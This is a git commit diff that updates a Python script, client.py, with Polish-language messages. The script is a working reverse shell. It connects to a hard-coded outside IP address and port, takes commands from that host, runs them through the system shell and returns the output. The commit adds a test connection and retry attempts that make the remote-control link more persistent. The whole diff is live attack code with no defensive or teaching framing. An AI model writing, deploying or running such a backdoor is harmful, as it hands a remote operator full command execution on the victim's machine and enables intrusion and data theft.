ea870c7bada1b94e8c25bd07c0266bcce11c3058
fszczes <fszczesniak61@gmail.com>
2025-01-09 23:50:14 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,21 +1,47 @@
 import socket
 import subprocess
+import time
+
+def test_connection():
+    """
+    Funkcja wykonuje krótkie testowe połączenie, które trwa maksymalnie sekundę.
+    """
+    try:
+        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        test_socket.settimeout(1)
+        test_socket.connect(("77.90.22.107", 12137))
+        test_socket.close()
+    except (socket.error, ConnectionError) as e:
+        print("Err1.")
 
 def client():
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect(("77.90.22.107", 12137)) 
+    retry_attempts = 2
+    attempt = 0
+    test_connection()
 
-    while True:
-        command = client_socket.recv(4096).decode()
-        if not command:
-            break
+    while attempt < retry_attempts:
         try:
-            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            client_socket.send(output)
-        except subprocess.CalledProcessError as e:
-            client_socket.send(f"Błąd podczas wykonywania polecenia:\n{e.output.decode()}".encode())
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect(("77.90.22.107", 12137))
+            print("Connected")
 
-    client_socket.close()
+            while True:
+                command = client_socket.recv(4096).decode()
+                if not command:
+                    break
+                try:
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    client_socket.send(output)
+                except subprocess.CalledProcessError as e:
+                    error_message = f"Err2:\n{e.output.decode()}"
+                    client_socket.send(error_message.encode())
+
+            client_socket.close()
+
+        except (socket.error, ConnectionError) as e:
+            attempt += 1
+            print(f"Err3. attempt {attempt}/{retry_attempts}.")
+            time.sleep(2)
 
 if __name__ == "__main__":
     client()
